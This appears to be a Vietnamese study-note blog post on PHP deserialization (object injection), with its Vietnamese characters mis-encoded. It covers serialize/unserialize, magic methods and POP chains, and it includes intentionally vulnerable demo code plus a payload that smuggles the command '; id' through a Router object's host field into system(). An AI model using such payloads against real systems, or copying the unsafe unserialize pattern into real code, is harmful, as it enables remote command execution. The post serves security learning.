---
title: PHP DESERIALIZATION (PHP OBJECT INJECTION)
category: Vulnerability
tags: [php-deserialization, php, deserialize]
---

M√¨nh vi·∫øt b√†i vi·∫øt n√†y ƒë·ªÉ ghi l·∫°i nh·ªØng g√¨ m√¨nh ƒë√£ h·ªçc ƒë∆∞·ª£c v·ªÅ l·ªó h·ªïng **PHP Deserialization** nh·∫±m m·ª•c ƒë√≠ch √¥n t·∫≠p v√† c·ªßng c·ªë ki·∫øn th·ª©c. N·∫øu c√≥ g√¨ sai s√≥t mong c√°c b·∫°n g√≥p √Ω v·ªõi m√¨nh.

## 1. T√¨m hi·ªÉu v·ªÅ Serialization v√† Deserialization

Tr∆∞·ªõc khi t√¨m hi·ªÉu v·ªÅ l·ªó h·ªïng PHP Deserialization, m√¨nh s·∫Ω t√¨m hi·ªÉu v·ªÅ hai thu·∫≠t ng·ªØ **Serialization** v√† **Deserialization** tr∆∞·ªõc.

- **Serialization:** L√† qu√° tr√¨nh chuy·ªÉn ƒë·ªïi m·ªôt ƒë·ªëi t∆∞·ª£ng th√†nh ƒë·ªãnh d·∫°ng d·ªØ li·ªáu nh∆∞: chu·ªói byte, JSON, XML, ... nh·∫±m d·ªÖ d√†ng l∆∞u tr·ªØ v√† truy·ªÅn d·ªØ li·ªáu gi·ªØa c√°c ·ª©ng d·ª•ng ƒë·ªÉ ph·ª•c v·ª• nhi·ªÅu m·ª•c ƒë√≠ch kh√°c nhau.
- **Deserialization:** L√† qu√° tr√¨nh ng∆∞·ª£c l·∫°i v·ªõi **Serialization**, th·ª±c hi·ªán chuy·ªÉn c√°c ƒë·ªãnh d·∫°ng d·ªØ li·ªáu tr√™n th√†nh ƒë·ªëi t∆∞·ª£ng ban ƒë·∫ßu.

Minh ho·∫° qu√° tr√¨nh **Serialization** v√† **Deserialization**:

![alt php_deserialization_1](../assets/images/php-deserialization/php_deserialization_1.png)

### 1.1. Qu√° tr√¨nh Serialization trong PHP

Trong PHP, ng∆∞·ªùi d√πng ƒë∆∞·ª£c cung c·∫•p m·ªôt h√†m g·ªçi l√† `serialize()` ƒë·ªÉ th·ª±c hi·ªán qu√° tr√¨nh **Serialization**.

![alt php_deserialization_2](../assets/images/php-deserialization/php_deserialization_2.png)

‚û°Ô∏è H√†m `serialize()` n√†y s·∫Ω chuy·ªÉn ho√° tr·∫°ng th√°i c·ªßa m·ªôt ƒë·ªëi t∆∞·ª£ng th√†nh m·ªôt chu·ªói d·ªØ li·ªáu c√≥ th·ªÉ l∆∞u tr·ªØ ho·∫∑c truy·ªÅn ƒëi.

- V√≠ d·ª•: Th·ª±c hi·ªán serialize ƒë·ªëi t∆∞·ª£ng `Student` c√≥ c√°c thu·ªôc t√≠nh nh∆∞ sau:

```php
class Student {
    private $id;
    private $fullName;
    private $age;
    private $gender;

    /**
     * @param $id
     * @param $fullName
     * @param $age
     * @param $gender
     */
    public function __construct($id, $fullName, $age, $gender)
    {
        $this->id = $id;
        $this->fullName = $fullName;
        $this->age = $age;
        $this->gender = $gender;
    }
}

$student = new Student(1, 'L√™ Ho√†ng Minh', 21, 'Male');
echo serialize($student);
```

- K·∫øt qu·∫£:

```php
O:7:"Student":4:{s:11:"Studentid";i:1;s:17:"StudentfullName";s:15:"L√™ Ho√†ng Minh";s:12:"Studentage";i:21;s:15:"Studentgender";s:4:"Male";}
```

‚ÑπÔ∏è Chu·ªói d·ªØ li·ªáu nh·∫≠n ƒë∆∞·ª£c sau qu√° tr√¨nh **serialize** ƒë∆∞·ª£c g·ªçi l√† **serialize data**.

üõï C·∫•u tr√∫c `serialize data`: `	
O:LENTH_OF_NAME:"CLASS_NAME":NUMBER_OF_PROPERTIES:{PROPERTIES}`

| Ki·ªÉu d·ªØ li·ªáu          | K√Ω hi·ªáu | V√≠ d·ª• bi·∫øn                        | Gi·∫£i th√≠ch                                               | Chu·ªói serialize                                                                         |
| --------------------- | ------- | --------------------------------- | -------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| **Boolean**           | `b`     | `true`                            | `b:1;`                                                   | `b` l√† ki·ªÉu boolean, `1` l√† gi√° tr·ªã `true`.                                             |
|                       |         | `false`                           | `b:0;`                                                   | `0` l√† gi√° tr·ªã `false`.                                                                 |
| **Integer**           | `i`     | `42`                              | `i:42;`                                                  | `i` l√† ki·ªÉu integer, `42` l√† gi√° tr·ªã s·ªë nguy√™n.                                         |
| **Float**             | `d`     | `3.14`                            | `d:3.14;`                                                | `d` l√† ki·ªÉu float, `3.14` l√† gi√° tr·ªã s·ªë th·ª±c.                                           |
| **String**            | `s`     | `"Hello"`                         | `s:5:"Hello";`                                           | `s` l√† ki·ªÉu string, `5` l√† ƒë·ªô d√†i chu·ªói, `"Hello"` l√† gi√° tr·ªã chu·ªói.                    |
| **Array**             | `a`     | `[1, 2, 3]`                       | `a:3:{i:0;i:1;i:1;i:2;i:2;i:3;}`                         | `a` l√† ki·ªÉu array, `3` l√† s·ªë ph·∫ßn t·ª≠, ti·∫øp theo l√† c√°c c·∫∑p kh√≥a-gi√° tr·ªã.                |
| **Associative Array** | `a`     | `["name" => "Minh", "age" => 21]` | `a:2:{s:4:"name";s:4:"Minh";s:3:"age";i:21;}`            | `a` l√† ki·ªÉu array, `2` l√† s·ªë ph·∫ßn t·ª≠, ti·∫øp theo l√† c√°c c·∫∑p kh√≥a-gi√° tr·ªã.                |
| **Object**            | `O`     | (ƒê·ªëi t∆∞·ª£ng `Person`)              | `O:6:"Person":2:{s:4:"name";s:4:"Minh";s:3:"age";i:21;}` | `O` l√† ki·ªÉu object, `6` l√† ƒë·ªô d√†i t√™n l·ªõp, `"Person"` l√† t√™n l·ªõp, `2` l√† s·ªë thu·ªôc t√≠nh. |
| **Null**              | `N`     | `null`                            | `N;`                                                     | `N` ƒë·∫°i di·ªán cho gi√° tr·ªã null.                                                          |

üìù **Note:** Trong PHP, khi m·ªôt thu·ªôc t√≠nh c·ªßa m·ªôt class l√† `private` th√¨ khi th·ª±c hi·ªán qu√° tr√¨nh **serialize** s·∫Ω ƒë∆∞·ª£c PHP th√™m t√™n class v√†o tr∆∞·ªõc t√™n thu·ªôc t√≠nh ƒë√≥ (V√≠ d·ª•: Thu·ªôc t√≠nh `id` c·ªßa class `Student` l√† `private` sau khi **serialize** th√¨ t√™n s·∫Ω l√† `Studentid`).

B·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu th√™m v·ªÅ h√†m `serialize()` trong PHP t·∫°i [ƒë√¢y](https://www.php.net/manual/en/function.serialize.php).

### 1.2. Qu√° tr√¨nh Deserialization trong PHP

Trong PHP c≈©ng cung c·∫•p cho ng∆∞·ªùi d√πng h√†m `unserialize()` ƒë·ªÉ th·ª±c hi·ªán qu√° tr√¨nh **Deserialization**.

![alt php_deserialization_3](../assets/images/php-deserialization/php_deserialization_3.png)

‚û°Ô∏è H√†m `unserialize()` s·∫Ω chuy·ªÉn ho√° m·ªôt chu·ªói d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c **serialize** v·ªÅ m·ªôt value c·ªßa PHP.

- V√≠ d·ª•: S·ª≠ d·ª•ng h√†m `unserialize()` ƒë·ªÉ ƒë∆∞a chu·ªói d·ªØ li·ªáu v·ª´a **serialize** ·ªü v√≠ d·ª• tr√™n v·ªÅ ƒë·ªëi t∆∞·ª£ng ban ƒë·∫ßu.

```php
class Student {
    // Gi·ªëng v√≠ d·ª• tr√™n
}

$student = new Student(1, 'L√™ Ho√†ng Minh', 21, 'Male');
$serialize_data = serialize($student);
$obj_serialized_data = unserialize($serialize_data);

echo "<pre>";
print_r($obj_serialized_data);
echo "</pre>";
```

- K·∫øt qu·∫£:

```php
Student Object
(
    [id:Student:private] => 1
    [fullName:Student:private] => L√™ Ho√†ng Minh
    [age:Student:private] => 21
    [gender:Student:private] => Male
)
```

B·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu th√™m v·ªÅ h√†m `unserialize()` trong PHP t·∫°i [ƒë√¢y](https://www.php.net/manual/en/function.unserialize.php).

## 2. L·ªó h·ªïng PHP Deserialization

### 2.1. T√¨m hi·ªÉu v·ªÅ l·ªó h·ªïng PHP Deserialization

- L·ªó h·ªïng **PHP Deserialization** (hay c√≤n ƒë∆∞·ª£c g·ªçi l√† **PHP Object Injection**) x·∫£y ra khi d·ªØ li·ªáu kh√¥ng tin c·∫≠y (**untrusted data**) r∆°i v√†o h√†m `unserialize()` gi√∫p cho k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ki·ªÉm so√°t m·ªôt ph·∫ßn ho·∫∑c ho√†n to√†n ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c t√°i t·∫°o t·ª´ qu√° tr√¨nh **Deserialize** d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng thay ƒë·ªïi thu·ªôc t√≠nh, class ho·∫∑c c√≥ th·ªÉ t·∫°o ra m·ªôt lu·ªìng th·ª±c thi m·ªõi.

- H·∫≠u qu·∫£ c·ªßa l·ªó h·ªïng n√†y r·∫•t ƒëa d·∫°ng (SQL Injection, Path Traversal, OS Command Injection, ...) v√¨ n√≥ ph·ª• v√†o m·∫´u code c√≥ s·∫µn c·ªßa ch∆∞∆°ng tr√¨nh.

### 2.2. Khai th√°c l·ªó h·ªïng PHP Deserialization

#### 2.2.1. S·ª≠a ƒë·ªïi thu·ªôc t√≠nh v√† class c·ªßa ƒë·ªëi t∆∞·ª£ng

- ƒê√¢y l√† kƒ© thu·∫≠t khai th√°c l·ªó h·ªïng **PHP Deserialization** c∆° b·∫£n nh·∫•t, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ tu·ª≥ √Ω thay ƒë·ªïi thu·ªôc t√≠nh v√† class c·ªßa ƒë·ªëi t∆∞·ª£ng theo √Ω m√¨nh.
- V√≠ d·ª•: Ta c√≥ m·ªôt game `Pokemon` cho ph√©p save file ch·ª©a th√¥ng tin nh√¢n v·∫≠t xu·ªëng m√°y.

  - File `pokemon.sav` ch·ª©a th√¥ng tin nh√¢n v·∫≠t c√≥ n·ªôi dung nh∆∞ sau:

  ```
  O:7:"Trainer":2:{s:4:"name";s:5:"Kaito";s:7:"pokemon";O:7:"Pokemon":4:{s:4:"name";s:11:"Kaito's Pet";s:4:"type";s:9:"bulbasaur";s:6:"health";i:139;s:6:"damage";i:55;}}
  ```

  - Thu·ªôc t√≠nh `health` v√† `damage` ch√≠nh l√† m√°u v√† damage c·ªßa con pokemon. Ta ho√†n to√†n c√≥ th·ªÉ s·ª≠a hai thu·ªôc t√≠nh n√†y th√†nh `99999999999` ƒë·ªÉ buff s·ª©c m·∫°nh cho con pokemon m√† kh√¥ng c·∫ßn ƒëi ƒë√°nh qu√°i nh·ªè.
  - File `pokemon.sav` sau khi ƒë∆∞·ª£c s·ª≠a:

  ```
  O:7:"Trainer":2:{s:4:"name";s:5:"Kaito";s:7:"pokemon";O:7:"Pokemon":4:{s:4:"name";s:11:"Kaito's Pet";s:4:"type";s:9:"bulbasaur";s:6:"health";i:99999999999;s:6:"damage";i:99999999999;}}
  ```

  - Game cho ph√©p ng∆∞·ªùi ch∆°i c√≥ th·ªÉ t·∫£i file l∆∞u th√¥ng tin nh√¢n v·∫≠t l√™n, v·∫≠y ch·ªâ c·∫ßn load file v·ª´a ch·ªânh s·ª≠a l√™n l·∫°i game. V√† ƒë√¢y l√† k·∫øt qu·∫£:

  ![alt text](../assets/images/php-deserialization/pokemon_game.png)

  - D∆∞·ªõi ƒë√¢y l√† ƒëo·∫°n code x·ª≠ l√Ω ch·ª©c nƒÉng **Load Game**:

  ```php
  if (isset($_GET["action"])) {
      if ($_GET["action"] == "save") {
          if (!isset($_SESSION["trainer"]))
              die('{"msg": "You havent started the game yet"}');

          $message = serialize($_SESSION["trainer"]);
          // T·∫£i v·ªÅ th√†nh file pokemon.sav
          // Reference: https://stackoverflow.com/questions/13279801/how-can-i-download-a-string-to-the-browser-using-php-not-a-text-file
          header('Content-Type: application/octet-stream');
          header("Content-disposition: attachment; filename=pokemon.sav");
          header("Content-Length: " . strlen($message));
          echo $message;
      } else if ($_GET["action"] == "load") {
          if (isset($_FILES["data"])) {
              $data = file_get_contents($_FILES["data"]["tmp_name"]);
              // X·ª≠ l√Ω khi unserialize b·ªã l·ªói
              // Reference: https://stackoverflow.com/questions/12684871/how-to-catch-unserialize-exception
              $trainer = @unserialize($data);
              if ($trainer == null) {
                  echo "Something went wrong";
              } else {
                  $_SESSION["trainer"] = $trainer;
                  echo "Load successfully";
              }
          } else {
              echo "Empty data";
          }
      }
  }
  ```

#### 2.2.2. Magic Methods trong Object-Oriented Programming (OOP)

Tr∆∞·ªõc khi t√¨m hi·ªÉu v·ªÅ k·ªπ thu·∫≠t khai th√°c l·ªó h·ªïng **PHP Deserialization** ti·∫øp theo, m√¨nh s·∫Ω t√¨m hi·ªÉu v·ªÅ c√°c Magic Methods trong OOP tr∆∞·ªõc.

**Magic Methods** trong OOP c·ªßa PHP l√† c√°c ph∆∞∆°ng th·ª©c ƒë·∫∑c bi·ªát ƒë∆∞·ª£c b·∫Øt ƒë·∫ßu b·∫±ng hai d·∫•u g·∫°ch d∆∞·ªõi `__`. C√°c ph∆∞∆°ng th·ª©c n√†y s·∫Ω ƒë∆∞·ª£c PHP t·ª± ƒë·ªông g·ªçi trong c√°c tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát, ch·∫≥ng h·∫°n nh∆∞: khi m·ªôt ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c kh·ªüi t·∫°o, khi ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ m·ªôt chu·ªói,... D∆∞·ªõi ƒë√¢y l√† m·ªôt s·ªë **Magic Methods** ph·ªï bi·∫øn trong PHP.

1. **\_\_construct():**

![alt php_deserialization_4](../assets/images/php-deserialization/php_deserialization_4.png)

- H√†m `__construct()` ƒë∆∞·ª£c s·ª≠ d·ª•ng r·∫•t th∆∞·ªùng xuy√™n trong l·∫≠p tr√¨nh OOP.
- H√†m n√†y gi√∫p ch√∫ng ta kh·ªüi t·∫°o thu·ªôc t√≠nh c·ªßa m·ªôt ƒë·ªëi t∆∞·ª£ng.
- PHP s·∫Ω t·ª± ƒë·ªông g·ªçi h√†m n√†y khi t·∫°o ƒë·ªëi t∆∞·ª£ng t·ª´ m·ªôt l·ªõp.
- V√≠ d·ª•:

```php
class Student {
    private $id;
    private $fullName;
    private $age;
    private $gender;

    /**
     * @param $id
     * @param $fullName
     * @param $age
     * @param $gender
     */
    public function __construct($id, $fullName, $age, $gender)
    {
        $this->id = $id;
        $this->fullName = $fullName;
        $this->age = $age;
        $this->gender = $gender;

        echo "__construct function is called";
    }
}

$student = new Student(1, 'L√™ Ho√†ng Minh', 21, 'Male');
```

- K·∫øt qu·∫£:

![alt result](../assets/images/php-deserialization/image.png)

2. **\_\_destruct():**

![alt __destruct](../assets/images/php-deserialization/destruct.png)

- H√†m `destruct()` s·∫Ω ƒë∆∞·ª£c t·ª± ƒë·ªông g·ªçi khi ƒë·ªëi t∆∞·ª£ng trong ch∆∞∆°ng tr√¨nh kh√¥ng c√≤n ƒë∆∞·ª£c tham chi·∫øu ƒë·∫øn n·ªØa.
- PHP s·∫Ω t·ª± ƒë·ªông g·ªçi m·ªçi h√†m `__destruct()` ƒë·ªÉ hu·ª∑ t·∫•t c·∫£ c√°c class c√≤n t·ªìn t·∫°i sau khi ho√†n t·∫•t ch∆∞∆°ng tr√¨nh.
- Qu√° tr√¨nh tr√™n ƒë∆∞·ª£c g·ªçi l√† **Clean up**.
- V√≠ d·ª•:

![alt text](../assets/images/php-deserialization/destruct_2.png)

3. **\_\_toString():**

![alt text](../assets/images/php-deserialization/toString.png)

- H√†m `__toString()` s·∫Ω t·ª± ƒë·ªông ƒë∆∞·ª£c g·ªçi (v·ªõi ƒëi·ªÅu ki·ªán ph·∫£i ƒë·ªãnh nghƒ©a h√†m n√†y trong class) khi mu·ªën in m·ªôt Object ra m√†n h√¨nh d∆∞·ªõi d·∫°ng chu·ªói.
- V√≠ d·ª•:

![alt text](../assets/images/php-deserialization/example_toString.png)

B·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu c√°c Magic Methods t·∫°i [ƒë√¢y](https://www.php.net/manual/en/language.oop5.magic.php).

#### 2.2.3. K·ªπ thu·∫≠t t·∫•n c√¥ng POP (Property Oriented Programming)

K·ªπ thu·∫≠t t·∫•n c√¥ng **POP Chain** hay c√≤n ƒë∆∞·ª£c g·ªçi l√† **Code Reuse Attack** l√† m·ªôt k·ªπ thu·∫≠t li√™n quan ƒë·∫øn vi·ªác t√°i s·ª≠ d·ª•ng c√°c ƒëo·∫°n code c·ªßa ch∆∞∆°ng tr√¨nh (c√≤n g·ªçi l√† **gadget**) ƒë·ªÉ li√™n k·∫øt ch√∫ng th√†nh m·ªôt chu·ªói th·ª±c thi (**chain**) ƒë·ªìng th·ªùi k·∫øt v·ªõi vi·ªác thay ƒë·ªïi thu·ªôc t√≠nh c·ªßa c√°c ƒë·ªëi t∆∞·ª£ng ƒë·ªÉ **can thi·ªáp v√†o lu·ªìng ho·∫°t ƒë·ªông c·ªßa ch∆∞∆°ng tr√¨nh**.

![alt text](../assets/images/php-deserialization/php_deserialization_2.2.3.png)

K·ªπ thu·∫≠t n√†y s·∫Ω t·∫≠n d·ª•ng nh·ªØng Magic Methods (nh·ªØng method t·ª± ƒë·ªông ƒë∆∞·ª£c g·ªçi trong c√°c tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát) k·∫øt h·ª£p v·ªõi nh·ªØng sink nguy hi·ªÉm nh∆∞: `system()`, `file_get_content()`, `include()`, `unlink()`,... ƒë·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng v√†o ·ª©ng d·ª•ng.

B·∫°n c√≥ th·ªÉ tham kh·∫£o th√™m v·ªÅ c√°c h√†m nguy hi·ªÉm trong PHP t·∫°i [ƒë√¢y](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720).

**V√≠ d·ª•:** M·ªôt ·ª©ng d·ª•ng cho ph√©p ng∆∞·ªùi d√πng load m·ªôt file ch·ª©a th√¥ng tin c√°c sinh vi√™n l√™n h·ªá th·ªëng c√≥ ƒëo·∫°n code x·ª≠ l√Ω nh∆∞ sau:

```php
case 'load':
        $data = file_get_contents($_FILES["data"]["tmp_name"]);
        $students_data = explode("|", $data);
        $students = array();
        for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
            $key = $students_data[$idx];
            $value = $students_data[$idx + 1];
            // X·ª≠ l√Ω khi unserialize b·ªã l·ªói
            // Reference: https://stackoverflow.com/questions/12684871/how-to-catch-unserialize-exception
            $value = unserialize($value);
            $students[$key] = $value;
            $_SESSION["students"] = $students;
        }
        echo "Loaded";
        echo '<meta http-equiv="refresh" content="1;url='. $_SERVER['PHP_SELF']. '">';
        die();
        break;
```

Ch∆∞∆°ng tr√¨nh s·∫Ω ƒë·ªçc d·ªØ li·ªáu t·ª´ file r·ªìi g√°n v√†o bi·∫øn `$data`. Sau qu√° tr√¨nh x·ª≠ l√Ω, d·ªØ li·ªáu trong bi·∫øn `$data` s·∫Ω ƒë∆∞·ª£c chuy·ªÉn v·ªÅ d·∫°ng m·∫£ng v√† l∆∞u ·ªü bi·∫øn `$students_data`. T·ª´ng ph·∫ßn t·ª≠ trong m·∫£ng `$students_data` s·∫Ω ƒë∆∞·ª£c duy·ªát qua v√≤ng l·∫∑p `for` v√† g√°n key, value l·∫ßn l∆∞·ª£t v√†o c√°c bi·∫øn `$key` v√† `$value`. Bi·∫øn `$value` s·∫Ω ƒë∆∞·ª£c deserialize ƒë·ªÉ t√°i t·∫°o l·∫°i ƒë·ªëi t∆∞·ª£ng ban ƒë·∫ßu, ch∆∞∆°ng tr√¨nh s·∫Ω l∆∞u gi√° tr·ªã ƒë·ªëi t∆∞·ª£ng ƒë√≥ v√†o m·∫£ng `$students` r·ªìi th√™m m·∫£ng ƒë√≥ v√†o `SESSION` v·ªõi key l√† `students`. Sau ƒë√≥, ch∆∞∆°ng tr√¨nh s·∫Ω l·∫•y `SESSION['students']` ra m·∫£ng c√°c sinh vi√™n ƒë·ªÉ hi·ªÉn th·ªã ra giao di·ªán.

![alt text](../assets/images/php-deserialization/table.png)

Trong ch∆∞∆°ng tr√¨nh c√≥ m·ªôt class c√≥ t√™n l√† `Router` c√≥ ch·ª©a m·ªôt sink nguy hi·ªÉm l√† `system()` c√≥ ƒëo·∫°n m√£ nh∆∞ sau:

```php
<?php
class Router
{
    public $host;

    public function __construct($host)
    {
        $this->host = $host;
    }

    public function __toString()
    {
        return system("ping " . $this->host);
    }
}
```

Do d·ªØ li·ªáu kh√¥ng tin c·∫≠y (untrusted data) r∆°i v√†o trong qu√° tr√¨nh deserialize ·ªü ch·ª©c nƒÉng `load file` ·ªü ƒëo·∫°n m√£: `$value = unserialize($value);` v√† trong ch∆∞∆°ng tr√¨nh c√≥ s·∫µn class `Router` ch·ª©a m·ªôt sink nguy hi·ªÉm trong PHP l√† `system()` k·∫øt h·ª£p v·ªõi magic method `__toString()` s·∫Ω t·ª± ƒë·ªông ƒë∆∞·ª£c g·ªçi khi ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c hi·ªÉn th·ªã d∆∞·ªõi d·∫°ng m·ªôt chu·ªói cho n√™n trong tr∆∞·ªùng h·ª£p n√†y k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ki·ªÉm so√°t lu·ªìng th·ª±c thi c·ªßa ch∆∞∆°ng tr√¨nh ƒë·ªÉ b·∫Øt ch∆∞∆°ng tr√¨nh th·ª±c hi·ªán c√¢u l·ªánh c·ªßa h·ªá ƒëi·ªÅu h√†nh.

D∆∞·ªõi ƒë√¢y l√† ƒëo·∫°n m√£ exploit ch∆∞∆°ng tr√¨nh tr√™n:

```php
<?php
# STEP 1: Create class Router
class Router
{
    public $host;

    public function __construct($host)
    {
        $this->host = $host;
    }

    public function __toString()
    {
        return system("ping " . $this->host);
    }
}

# STEP 2: Create object Router and manipulate property
$payload = new Router("8.8.8.8; id");

# STEP 3: Generate serialize data
echo serialize($payload);
```

‚û° Payload: `0|O:6:"Router":1:{s:4:"host";s:11:"8.8.8.8; id";}`.

V√† ƒë√¢y l√† k·∫øt qu·∫£ khi ta upload file ch·ª©a payload l√™n h·ªá th·ªëng.

![alt text](../assets/images/php-deserialization/id_command.png)

B·∫°n c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng tool [PHPGGC](https://github.com/ambionics/phpggc) ƒë·ªÉ t·∫°o payload v·ªõi nh·ªØng gadgets chain ƒë√£ ƒë∆∞·ª£c t√¨m th·∫•y trong nhi·ªÅu th∆∞ vi·ªán.

## 3. References

- [CBJS](https://cyberjutsu.io/)
- [https://nhattruong.blog/2022/11/18/php-object-injection-a-k-a-php-insecure-deserialization/](https://nhattruong.blog/2022/11/18/php-object-injection-a-k-a-php-insecure-deserialization/)
- [https://hackmd.io/@chuong/insecure-deserialization-trong-php](https://hackmd.io/@chuong/insecure-deserialization-trong-php)
